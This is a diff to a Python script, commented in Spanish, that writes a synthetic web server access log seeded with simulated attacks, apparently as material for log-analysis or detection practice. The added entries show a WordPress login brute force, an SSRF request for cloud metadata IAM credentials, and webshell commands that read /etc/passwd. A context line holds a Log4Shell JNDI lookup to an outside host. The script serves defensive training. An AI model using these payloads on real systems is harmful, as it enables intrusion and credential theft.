@@ -134,6 +134,22 @@ def main() -> None:
     t = t0 + timedelta(hours=10, minutes=15)
     log.hit(t, "203.0.113.140", "GET / HTTP/1.1", 200, 3586, ua="${jndi:ldap://198.51.100.200:1389/a}")
 
+    # 8) Fuerza bruta contra el login de WordPress (responde 200 aunque la contraseña esté mal).
+    t = t0 + timedelta(hours=10, minutes=40)
+    for _ in range(30):
+        t += timedelta(seconds=rng.randint(2, 6))
+        log.hit(t, "203.0.113.155", "POST /wp-login.php HTTP/1.1", 200, 4100, ua="Mozilla/5.0")
+
+    # 9) SSRF: intenta que el servidor le lea las credenciales de la nube.
+    t = t0 + timedelta(hours=11)
+    log.hit(t, "203.0.113.160", "GET /preview?url=http://169.254.169.254/latest/meta-data/iam/ HTTP/1.1", 200, 312)
+
+    # 10) Una webshell que alguien subió antes y ahora usa (responde 200: existe).
+    t = t0 + timedelta(hours=11, minutes=30)
+    for cmd in ["whoami", "uname+-a", "cat+/etc/passwd"]:
+        t += timedelta(seconds=rng.randint(5, 20))
+        log.hit(t, "203.0.113.170", f"GET /wp-content/uploads/2026/09/thumb.php?cmd={cmd} HTTP/1.1", 200, 77)
+
     log.write(OUT)
     print(f"{OUT} generado con {len(log.lines)} líneas")
 
